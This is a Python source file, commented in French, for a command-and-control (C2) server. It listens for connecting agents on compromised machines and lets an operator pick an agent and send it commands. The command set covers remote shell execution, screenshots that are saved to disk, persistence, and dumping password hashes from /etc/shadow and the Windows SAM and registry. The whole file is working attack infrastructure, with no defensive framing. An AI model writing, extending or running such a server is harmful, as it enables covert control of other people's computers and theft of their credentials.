#Code serveur C2
import socket
import json
import struct
import threading
import os
from datetime import datetime

ENCODING = "utf-8"
HOST = "0.0.0.0"
PORT = 8080

#Fonctions réseau

def send_msg(sock: socket.socket, payload: dict) -> None:
    """Pour envoyer un json"""
    data = json.dumps(payload).encode(ENCODING)
    sock.sendall(struct.pack(">I", len(data)) + data)

def send_bytes(sock: socket.socket, blob: bytes, meta: dict) -> None:
    """Pour envoyer des bytes (screenshot, fichier…)"""
    header = json.dumps(meta).encode(ENCODING)
    sock.sendall(struct.pack(">I", len(header)) + header)
    sock.sendall(struct.pack(">I", len(blob)) + blob)

def _receiveN(sock: socket.socket, n: int) -> bytes | None:
    """Lit exactement n octets"""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf

def receiveMessage(sock: socket.socket) -> dict:
    """Pour recevoir un json"""
    raw_len = _receiveN(sock, 4)
    if raw_len is None:
        raise ConnectionError("connexion coupée par le client")
    (msg_len,) = struct.unpack(">I", raw_len)
    data = _receiveN(sock, msg_len)
    if data is None:
        raise ConnectionError("connexion interrompue en cours de message")
    return json.loads(data.decode(ENCODING))

def receiveBytes(sock: socket.socket) -> bytes:
    """Pour recevoir des bytes bruts genre screenshot"""
    raw_len = _receiveN(sock, 4)
    if raw_len is None:
        raise ConnectionError("connexion coupée")
    (blob_len,) = struct.unpack(">I", raw_len)
    data = _receiveN(sock, blob_len)
    if data is None:
        raise ConnectionError("données incomplètes")
    return data


#Gestion des agents connectés

class Agent:
    _counter = 0

    def __init__(self, sock, addr):
        Agent._counter += 1
        self.id = Agent._counter
        self.sock = sock
        self.ip = addr[0]
        self.port = addr[1]
        self.hostname = "?"
        self.os = "?"
        self.user = "?"
        self.connected_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.alive = True
        self.lock = threading.Lock()

agents = {}
agents_lock = threading.Lock()
current_agent = None


#Serveur TCP écoute les connexions entrantes

def start_listener():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen(5)
    print(f"Écoute sur {HOST}:{PORT}")

    while True:
        try:
            client_sock, addr = srv.accept()
        except OSError:
            break
        t = threading.Thread(target=handle_new_agent, args=(client_sock, addr), daemon=True)
        t.start()

def handle_new_agent(sock, addr):
    #Quand un nouveau client se connecte il envoie ses infos
    agent = Agent(sock, addr)
    try:
        info = receiveMessage(sock)
        agent.hostname = info.get("hostname", "?")
        agent.os = info.get("os", "?")
        agent.user = info.get("ip", "?")
    except ConnectionError:
        sock.close()
        return

    with agents_lock:
        agents[agent.id] = agent
    print(f"\nAgent #{agent.id} — {agent.ip}")
    print_prompt()


#Envoyer et recevoir les reponses des agents

def recv_response(agent):
    """Recoit la reponse json d'un agent"""
    try:
        return receiveMessage(agent.sock)
    except ConnectionError:
        print(f"\nAgent #{agent.id} déconnecté")
        remove_agent(agent.id)
        return None

def remove_agent(agent_id):
    global current_agent
    with agents_lock:
        agent = agents.pop(agent_id, None)
        if agent:
            agent.alive = False
            try:
                agent.sock.close()
            except OSError:
                pass
    if current_agent and current_agent.id == agent_id:
        current_agent = None

def send_to_agent(payload, label=None):
    #Envoie une commande a l'agent selectionné et affiche ce qu'il repond
    if not current_agent:
        print("Aucun agent sélectionné (use <id>)")
        return
    try:
        with current_agent.lock:
            send_msg(current_agent.sock, payload)
            resp = recv_response(current_agent)
    except (ConnectionError, OSError) as e:
        print(f"Erreur: {e}")
        return
    if resp is None:
        return
    if label:
        print(f"\n{label}")
    afficher_reponse(resp)
    print()


#Affichage des reponses

def afficher_reponse(resp):
    status = resp.get("status", "?")
    if status == "error":
        print(f"Erreur agent: {resp.get('message', '?')}")
        return

    if "output" in resp:
        print(resp["output"], end="")
        rc = resp.get("returncode", "?")
        if rc != 0:
            print(f"[returncode: {rc}]")

    elif "data" in resp:
        data = resp["data"]
        if isinstance(data, dict):
            for k, v in data.items():
                print(f"  {k}: {v}")
        elif isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    for k, v in item.items():
                        print(f"  {k}: {v}")
                    print()
                else:
                    print(f"  {item}")
        else:
            print(data)

    elif "ip" in resp:
        print(f"  IP: {resp['ip']}")
    elif "message" in resp:
        print(f"  {resp['message']}")
    else:
        print(json.dumps(resp, indent=2))


#Interpreteur de commandes

def print_prompt():
    if current_agent:
        p = f"C2 (agent #{current_agent.id})> "
    else:
        p = "C2> "
    print(p, end="", flush=True)

def cmd_help():
    print("""
  agents / use <id> / kill <id> / exit
  shell <cmd> / screenshot / sysinfo / ip / list_users
  persistence / shadow / list_home / sam / registry
""")

def cmd_agents():
    with agents_lock:
        if not agents:
            print("Aucun agent connecté")
            return
        print(f"\n{'ID':<6}{'IP':<18}{'OS':<12}{'Hostname':<20}{'Connecté à':<20}")
        print("-" * 76)
        for a in agents.values():
            marker = " *" if current_agent and current_agent.id == a.id else ""
            print(f"{a.id:<6}{a.ip:<18}{a.os:<12}{a.hostname:<20}{a.connected_at:<20}{marker}")
    print()

def cmd_use(arg):
    global current_agent
    try:
        aid = int(arg)
    except ValueError:
        print("Usage: use <id>")
        return
    with agents_lock:
        agent = agents.get(aid)
    if not agent:
        print(f"Agent #{aid} introuvable")
        return
    current_agent = agent
    print(f"Agent #{aid} sélectionné")

def cmd_kill(arg):
    try:
        aid = int(arg)
    except ValueError:
        print("Usage: kill <id>")
        return
    if aid not in agents:
        print(f"Agent #{aid} introuvable")
        return
    remove_agent(aid)
    print(f"Agent #{aid} déconnecté")

def cmd_screenshot():
    #Envoie screenshot et sauvegarde le png
    if not current_agent:
        print("Aucun agent sélectionné (use <id>)")
        return
    try:
        with current_agent.lock:
            send_msg(current_agent.sock, {"cmd": "screenshot"})
            meta = receiveMessage(current_agent.sock)
            if meta.get("status") != "ok":
                print(f"Erreur: {meta.get('message', '?')}")
                return
            png_data = receiveBytes(current_agent.sock)
    except (ConnectionError, OSError) as e:
        print(f"Erreur: {e}")
        return

    os.makedirs("screenshots", exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"screenshots/agent{current_agent.id}_{ts}.png"
    with open(filename, "wb") as f:
        f.write(png_data)
    print(f"Screenshot sauvegardé: {filename} ({len(png_data)} octets)")


#Boucle principale

def main():
    listener = threading.Thread(target=start_listener, daemon=True)
    listener.start()

    print("C2 Server")

    while True:
        try:
            print_prompt()
            raw = input().strip()
        except (EOFError, KeyboardInterrupt):
            print("\nArrêt du C2")
            break

        if not raw:
            continue

        parts = raw.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        if cmd == "help":
            cmd_help()
        elif cmd == "agents":
            cmd_agents()
        elif cmd == "use":
            cmd_use(arg)
        elif cmd == "kill":
            cmd_kill(arg)
        elif cmd in ("exit", "quit"):
            print("Arrêt du C2")
            break
        elif cmd == "shell":
            if not arg:
                print("Usage: shell <commande>")
            else:
                send_to_agent({"cmd": "shell", "command": arg}, label=f"shell: {arg}")
        elif cmd == "screenshot":
            cmd_screenshot()
        elif cmd in ("sysinfo", "list_users", "ip", "persistence",
                      "shadow", "list_home", "sam", "registry"):
            send_to_agent({"cmd": cmd}, label=cmd)
        else:
            print(f"Commande inconnue: {cmd}")


if __name__ == "__main__":
    main()
